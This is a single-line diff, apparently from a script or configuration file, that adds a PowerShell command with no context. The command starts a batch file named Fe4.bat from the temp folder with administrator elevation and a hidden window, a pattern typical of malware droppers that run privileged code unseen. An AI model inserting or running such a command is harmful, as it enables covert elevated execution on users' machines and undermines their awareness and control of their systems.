@@ -1,0 +1,1 @@
+powershell start-Process "%temp%\Fe4.bat" -Verb "runas" -WindowStyle hidden
